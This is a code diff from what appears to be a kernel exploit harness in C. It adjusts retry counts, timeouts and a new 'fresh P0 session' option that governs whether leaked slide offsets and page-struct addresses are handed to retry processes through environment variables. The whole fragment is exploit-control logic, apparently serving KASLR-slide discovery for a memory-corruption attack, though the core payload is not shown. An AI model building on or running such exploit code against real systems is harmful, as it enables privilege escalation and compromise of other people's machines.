@@ -1,13 +1,19 @@
 #include "common.h"
 
+#ifndef DEFAULT_EXPLOIT_ATTEMPTS
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define DEFAULT_EXPLOIT_ATTEMPTS 24
 #else
 #define DEFAULT_EXPLOIT_ATTEMPTS 16
 #endif
+#endif
 #define DEFAULT_PSELECT_DELAY_USEC 20000
+#ifndef DEFAULT_ATTEMPT_TIMEOUT_SEC
 #define DEFAULT_ATTEMPT_TIMEOUT_SEC 90
+#endif
+#ifndef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
 #define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 20
+#endif
 #define APP_MIN_BOOT_UPTIME_SEC 120
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
@@ -212,6 +218,11 @@ __attribute__((constructor)) static void load(void) {
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
     if (!getenv("SLIDE_P0_OFFSET") &&
         atomic_load(&app_p0_state->ready)) {
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+      pr_error("fresh P0 session was consumed by the failed child; "
+               "refusing cross-process retry, reboot required\n");
+      break;
+#else
       uintptr_t offset = atomic_load(&app_p0_state->offset);
       uintptr_t gate_page = atomic_load(&app_p0_state->gate_page_struct);
       uintptr_t probe_page = atomic_load(&app_p0_state->probe_page_struct);
@@ -226,8 +237,15 @@ __attribute__((constructor)) static void load(void) {
       SYSCHK(setenv("P0_PROBE_PAGE_STRUCT", probe_page_arg, 1));
       pr_success("supervisor retained p0_offset=%s gate=%s probe=%s\n",
                  offset_arg, gate_page_arg, probe_page_arg);
+#endif
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+    } else if (!getenv("SLIDE_P0_OFFSET") &&
+               atomic_load(&app_p0_state->dirty)) {
+      pr_error("p0 oracle dirtied before slide discovery; refusing unsafe retry\n");
+#else
     } else if (atomic_load(&app_p0_state->dirty)) {
       pr_error("p0 oracle state dirty or uncertain; refusing unsafe retry\n");
+#endif
       break;
     }
 #endif
